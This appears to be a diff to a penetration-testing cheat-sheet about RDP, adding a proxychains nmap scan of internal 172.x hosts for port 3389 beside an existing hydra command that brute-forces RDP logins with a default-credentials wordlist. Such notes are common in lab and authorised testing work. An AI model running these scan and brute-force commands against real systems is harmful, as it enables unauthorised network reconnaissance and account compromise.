@@ -3,7 +3,10 @@
 ☑️
 > Auch ms-wbt-server
 
-
+## Check for machines that have it enabled
+```bash
+proxychains nmap -Pn -sT -p3389 $(cat /etc/hosts | grep 172 | cut -f 1 | tr '\n' ' ')
+```
 ## Bruteforce default credentials
 ```
 hydra -C /usr/share/seclists/Passwords/Default-Credentials/windows-betterdefaultpasslist.txt rdp://$hip -vV -t 1 -I -s 3389
